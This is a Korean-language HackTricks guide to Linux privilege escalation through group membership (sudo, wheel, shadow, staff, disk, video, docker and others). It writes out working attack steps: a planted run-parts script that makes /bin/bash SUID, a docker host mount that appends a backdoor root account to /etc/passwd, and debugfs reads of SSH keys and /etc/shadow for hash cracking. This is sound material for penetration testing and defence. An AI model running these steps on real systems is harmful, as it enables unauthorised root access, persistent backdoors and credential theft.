# 흥미로운 그룹 - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/관리자 그룹

### **PE - Method 1**

**때때로**, 시스템의 **/etc/sudoers** 정책(또는 이 파일에서 포함하는 파일)에 다음과 같은 항목이 있습니다:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

이는 두 항목 중 하나에 해당하는 사용자라면 누구나 `sudo`를 통해 대상 사용자가 누구든 어떤 명령이든 실행할 수 있다는 뜻입니다(나머지 정책 조건에 따름).<sup>[[3]](#references)</sup>

이 경우 **root가 되려면 다음을 실행하면 됩니다**:

```
sudo su
```

`sudo -l`에서 사용자 이름만 지정하는 제한된 `adduser` 실행이 허용된다면, 아직 존재하지 않는 동일한 이름의 기본 그룹이 생성되는지 확인하세요. 해당 그룹에 속한 새 계정은 유효한 sudoers 정책이 이미 `%group`에 권한을 부여하는 경우 권한을 얻을 수 있습니다. 이를 권한 상승 경로로 간주하기 전에 그룹 생성 동작과 그룹 규칙을 모두 확인하세요. 계정을 만들면 시스템이 변경되므로 먼저 정책을 살펴보세요.

### PE - Method 2

모든 suid 바이너리를 찾고 **Pkexec** 바이너리가 있는지 확인하세요:

```bash
find / -perm -4000 2>/dev/null
```

**pkexec가 SUID 바이너리**인 경우, polkit이 요청된 작업을 승인해야만 다른 사용자로 프로그램을 실행할 수 있습니다. SUID 비트만으로 root 권한이 보장되지는 않습니다. **sudo** 또는 **admin** 그룹에 속해 있으면 충분하다고 가정하지 말고, 설치된 정책과 대상 세션의 권한 부여 상태를 확인하세요.<sup>[[4]](#references)[[5]](#references)</sup>

별도의 [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) 경로에서는 먼저 `pkexec`가 실행 가능한 **root 소유 SUID** 파일인지 확인하세요. 해당 비트가 설정되지 않은 설치 바이너리는 권고문에서 설명하는 로컬 SUID 권한 상승에 해당하지 않습니다. 업스트림 버전 문자열은 단서일 뿐입니다. 배포판은 [이전 패키지 버전에 수정 사항을 backport할 수 있으므로](https://ubuntu.com/security/CVE-2021-4034), 취약하다고 판단하기 전에 설치된 벤더 패키지와 완화 조치를 확인하세요.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/)은 다른 polkit 경로입니다. `pkexec` SUID 취약점이 아니라 D-Bus 권한 부여 경쟁 조건입니다. 설치된 벤더 polkit 패키지와, 접근 가능한 권한 있는 D-Bus 작업으로 유용한 변경을 일으킬 수 있는지 확인하세요. 계정 생성 경로에는 AccountsService와 같은 적절한 서비스도 필요하며, 새 그룹의 sudo 접근 권한은 유효한 sudo 정책에 따라 달라집니다. 보고된 polkit 버전이나 서비스가 설치되어 있다는 사실만으로는 후보에 불과합니다. 특히 벤더가 [수정 사항을 backport한 경우](https://access.redhat.com/security/cve/cve-2021-3560)가 그렇습니다. 수동 열거 과정에서 경쟁 조건을 유발해서는 안 됩니다.

여전히 구형 Local Authority 백엔드를 사용하는 배포판에서는 다음 명령으로 그룹 규칙을 확인하세요:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

관련 그룹 이름과 기본값은 배포판마다 다릅니다. 여기서 그룹은 로컬 정책에 명시된 경우에만 유용합니다.<sup>[[5]](#references)</sup>

**root가 되려면 다음을 실행할 수 있습니다**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

**pkexec**를 실행하려고 할 때 다음 **오류**가 발생하면:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

등록된 authentication agent가 없는 SSH 세션에서는 정책상 작업이 허용되더라도 `pkexec`가 이 오류와 함께 실패할 수 있습니다. polkit은 데스크톱이 아닌 세션에서 사용할 텍스트 authentication agent로 `pkttyagent`를 안내합니다. 정확한 동작은 버전과 배포판에 따라 다르므로 로컬 정책과 agent 설정을 확인하세요. 영향을 받는 NixOS 버전에서 보고된 한 가지 우회 방법은 **서로 다른 SSH 세션 2개**를 사용하는 것입니다.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

한 계정의 `su` 접근을 거부하는 ACL은 해당 실행 파일에만 적용되며, 관리자 권한으로 허용된 작업을 수행하는 모든 경로를 차단하지는 않습니다. 관리자 자격 증명이 별도로 노출된 경우, `systemd-run`을 통해 임시 시스템 서비스를 시작하는 별도의 작업이 실제 polkit 정책에서 허용되는지, authentication agent가 어떤 신원을 받아들이는지, 그리고 실행된 서비스가 어떤 신원으로 동작하는지 검토하세요. [Polkit은 세션 소유자로 인증하는 것과 관리자로 인증하는 것을 구분합니다](https://polkit.pages.freedesktop.org/polkit/polkit.8.html). 또한 [systemd-run은 시스템 관리자에게 임시 서비스를 요청할 수 있습니다](https://systemd.io/CONTROL_GROUP_INTERFACE/). 기록에 명령이 있거나, 명령이 설치되어 있거나, 정책 파일을 읽을 수 있다는 사실만으로는 권한이나 자격 증명의 유효성이 입증되지 않습니다. 수동으로 검토할 때는 자격 증명을 입력하거나 유닛을 시작하지 마세요.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel 그룹

때때로 sudoers 정책에 다음 항목이 포함되어 있을 수도 있습니다:

```
%wheel	ALL=(ALL:ALL) ALL
```

이는 해당 항목과 일치하는 모든 사용자가 `sudo`를 통해 대상 사용자를 지정해 어떤 명령이든 실행할 수 있음을 의미합니다(나머지 정책에 따름).<sup>[[3]](#references)</sup>

이 경우 **root가 되려면 다음 명령만 실행하면 됩니다**:

```
sudo su
```

## shadow 그룹

권한이 허용된 시스템에서는 **shadow** 그룹의 사용자가 **/etc/shadow**를 **읽을** 수 있습니다. 대상 시스템의 실제 mode와 ACL을 확인하세요:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

파일을 읽고 **hash를 crack**해 보세요.

hash를 분류할 때 알아둘 잠금 상태 관련 세부 사항:
- `!` 또는 `*`가 있는 항목은 일반적으로 password 로그인에 사용할 수 없습니다.
- `!hash`는 password가 잠긴 상태라는 뜻이며, 나머지 문자는 잠기기 전의 password 필드 값을 나타냅니다.
- `*`가 포함된 필드는 유효한 `crypt(3)` hash가 아니므로 UNIX-password 로그인을 막습니다. 이것만으로 password가 이전에 설정되었는지는 알 수 없습니다.
직접 로그인할 수 없는 경우에도 계정을 분류하는 데 유용합니다.<sup>[[6]](#references)</sup>

## Staff Group

**staff**: root 권한 없이도 사용자가 시스템에 로컬 변경 사항을 추가할 수 있습니다(`/usr/local`). (`/usr/local/bin`의 실행 파일은 모든 사용자의 PATH 변수에 포함되며, 같은 이름의 `/bin` 및 `/usr/bin` 실행 파일을 "대체"할 수 있습니다.) 모니터링/보안과 더 관련된 "adm" 그룹과 비교해 보세요.<sup>[[2]](#references)[[7]](#references)</sup>

아래 예시처럼 `/usr/local/bin`이 `/usr/bin`보다 앞에 오는 Debian 설정에서는, 경로를 지정하지 않은 명령은 먼저 `/usr/local/bin`의 파일을 실행합니다. 대상 시스템의 실제 `PATH`를 확인하세요.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

특권 프로세스가 경로를 지정하지 않은 명령을 쓰기 가능한 `/usr/local/bin`에서 찾는 경우, 해당 명령을 교체하면 프로세스의 권한으로 코드를 실행할 수 있습니다. 테스트하기 전에 실제 경로와 실행 조건을 확인하세요.

Ubuntu 시스템에서는 로그인 시 `pam_motd`가 `run-parts --lsbsysinit`을 통해 실행 파일 스크립트를 root 권한으로 실행합니다. cron 작업도 `run-parts`를 사용할 수 있지만, 이는 배포판 및 설정에 따라 다릅니다.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

새 SSH 로그인 시 `pspy`를 사용하면 대상에서 이 경로가 실제로 호출되는지 확인할 수 있습니다. root 권한 없이 프로세스 명령줄을 관찰할 수 있습니다.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Group

**disk** 그룹에 속하면 블록 장치에 대한 원시 액세스 권한이 부여될 수 있으며, 이는 **root 액세스 권한에 가까운 경우가 많습니다**. Debian에서는 대체로 root와 동등하다고 설명하지만, 대상 시스템에서 실제 장치 권한과 스토리지 구성을 확인하세요.<sup>[[7]](#references)</sup>

일반적인 장치 경로에는 `/dev/sd*`가 있지만, NVMe 및 기타 스토리지 구성에서는 다른 이름을 사용합니다.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs`는 ext2/ext3/ext4 파일시스템에서 작동합니다. 위의 `/root` 및 `/etc/shadow` 같은 경로는 열려 있는 파일시스템 내부의 파일이고, `dump`의 두 번째 인수는 기본 파일시스템의 출력 경로입니다.<sup>[[8]](#references)</sup> 예를 들어, 다음 명령은 열려 있는 파일시스템에서 `/tmp/asd1.txt`를 추출해 기본 파일시스템의 `/tmp/asd2.txt`에 저장합니다:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

`-w` 옵션은 파일 시스템을 읽기-쓰기로 열고, `write` 명령은 네이티브 파일을 열린 파일 시스템으로 복사합니다. 마운트된 라이브 파일 시스템에서는 직접 수정하면 파일 시스템이 손상될 수 있으므로 사용하지 마세요. 가능하면 오프라인 이미지에서 작업하세요.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video 그룹

`w` 명령을 사용하면 **시스템에 로그인한 사용자**를 확인할 수 있으며, 다음과 같은 출력이 표시됩니다.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** 항목은 첫 번째 Linux 가상 콘솔을 나타내지만, 특히 컨테이너나 다른 환경에서는 사용자가 물리적으로 시스템 앞에 있다는 사실을 그 자체로 입증하지 않습니다.<sup>[[21]](#references)</sup>

읽을 수 있는 프레임버퍼 장치가 노출된 시스템에서는 **video** 그룹의 구성원이 해당 장치에 접근할 수 있습니다. Linux 프레임버퍼 인터페이스 문서에는 `/dev/fb0`가 화면 스냅샷을 위해 복사할 수 있는 읽기 가능한 메모리 장치로 설명되어 있습니다. `/sys/class/graphics/fb0/virtual_size` 경로는 해당 fbdev sysfs 속성이 있는 경우에만 사용할 수 있으므로, 먼저 대상 시스템에서 확인하세요.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

설치된 **GIMP** 버전에서 raw-data importer를 제공한다면 해당 importer로 **`screen.raw`**를 여세요. 지원 기능과 컨트롤은 버전 및 플러그인에 따라 다릅니다.<sup>[[22]](#references)</sup>

![디스크 그룹 - 비디오 그룹: raw 이미지를 열려면 GIMP를 사용하고 screen.raw 파일을 선택한 다음 파일 형식으로 Raw image data를 선택하세요](<../../../images/image (463).png>)

이미지 Width와 Height를 framebuffer의 기하 구조에 맞게 설정하고, 출력 내용을 알아볼 수 있을 때까지 사용 가능한 pixel formats/Image Types를 바꿔가며 시도하세요.<sup>[[9]](#references)</sup>

![디스크 그룹 - 비디오 그룹: 그런 다음 Width와 Height를 화면에 사용되는 값으로 변경하고 다른 Image Types를 확인하세요(화면이 가장 잘 표시되는 항목을 선택하세요)](<../../../images/image (317).png>)

## Root 그룹

**root** 그룹에 속해도 root의 UID를 얻는 것은 아니지만, 권한이 있는 서비스나 라이브러리가 사용하는 `root` 소유의 그룹 쓰기 가능 파일은 여전히 흥미로운 대상일 수 있습니다. 권한 상승 경로로 간주하기 전에 파일의 실제 권한과 사용 방식을 확인하세요.

**root 그룹 구성원이 수정할 수 있는 파일 확인**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

표준 rootful 설치에서 `docker` 그룹에 속하면 Docker daemon에 대한 root 수준의 접근 권한이 부여됩니다. bind mount는 기본적으로 읽기-쓰기가 가능하므로, daemon을 제어할 수 있는 사용자는 호스트의 `/`를 컨테이너에 마운트하고 호스트 파일을 변경할 수 있습니다. 이는 사실상 호스트에서 root 권한을 얻는 것과 같습니다.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

`/etc/group`, `/etc/gshadow` 및 현재 프로세스 토큰 간에 그룹 멤버십 정보가 일치하지 않을 수 있습니다. `id -nG`에 사용자가 표시되지 않지만 `newgrp docker`가 성공한다면, 새 셸에서 `id`가 표시하는 그룹을 확인하고 Docker socket에 실제로 쓰기 권한이 있는지, rootful daemon을 제공하는지 테스트하세요. 그룹 이름만으로 호스트를 제어할 수 있다고 단정할 수는 없습니다. 자동화된 `newgrp` probe는 비밀번호 프롬프트로 인해 열거 작업이 멈추지 않도록 제한 시간을 설정하세요.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

마지막으로, 앞서 제안한 방법이 마음에 들지 않거나 어떤 이유로든 작동하지 않는다면(docker api firewall?) **privileged container를 실행한 뒤 탈출**해 볼 수도 있습니다. 자세한 내용은 여기를 참조하세요:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

docker socket에 쓰기 권한이 있다면 [**docker socket을 악용해 권한을 상승하는 방법에 관한 이 게시물**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**을 읽어 보세요.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm Group

일반적으로 **`adm`** 그룹의 **구성원**은 _/var/log/_ 내에 있는 로그 파일을 **읽을** 권한이 있습니다.\
따라서 이 그룹에 속한 사용자를 침해했다면 반드시 **로그를 살펴봐야 합니다**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

이 그룹들은 서비스 및 배포판에 따라 의미가 다릅니다. Debian 문서에 따르면 `backup`은 백업/복원 위임, `lp`는 프린터 데몬, `mail`은 `/var/mail`과 관련이 있으므로, 그룹 멤버십을 권한 상승 경로로 간주하기 전에 로컬 권한을 확인하세요.<sup>[[7]](#references)</sup>

이 그룹들은 직접적인 root 경로라기보다 **credential-discovery** 경로인 경우가 많습니다.
- **backup**: 설정 파일, 키, DB dump 또는 token이 포함된 archive에 접근할 수 있습니다.
- **operator**: 플랫폼별 운영 권한으로 인해 민감한 runtime 데이터를 leak할 수 있습니다.
- **lp**: print queue/spool에 문서 내용이 들어 있을 수 있습니다.
- **mail**: mail spool에서 비밀번호 재설정 링크, OTP, 내부 credential을 찾을 수 있습니다.

이 그룹의 멤버십은 중요한 데이터 노출 문제로 간주하고, 비밀번호/token 재사용을 통해 추가로 접근하세요.

## Auth group

OpenBSD에서 S/Key를 설정한 경우 `/etc/skey`의 소유자는 `root:auth`이며, 해당 기록에 접근하려면 `auth` 그룹이 필요합니다. YubiKey 기록은 `/var/db/yubikey`에 저장됩니다.<sup>[[16]](#references)[[17]](#references)</sup> S/Key 또는 YubiKey가 활성화된 취약한 OpenBSD 6.6 설정에서는 `auth` 권한이 있는 로컬 사용자가 root 권한을 획득할 수 있었습니다. Qualys 문서에는 전제 조건과 exploit chain이 설명되어 있으며, 링크된 PoC는 이를 구현합니다.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [GUI 세션 없이 수행하는 pkexec/pkttyagent 인증 (NixOS 이슈 #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian 보안 매뉴얼](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux 매뉴얼 페이지](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [프레임 버퍼 장치 — Linux 커널 문서](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — 권한 없는 Linux 프로세스 감시 도구](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine 보안](https://docs.docker.com/engine/security/)
- [14] [root가 아닌 사용자로 Docker 관리하기](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [컨테이너 실행 — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD 매뉴얼 페이지](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD 매뉴얼 페이지](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD 인증 취약점 — Qualys 보안 권고](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — 로컬 exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux 할당 장치 (4.x 이상 버전)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [이미지 가져오기 및 내보내기 — GIMP 문서](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
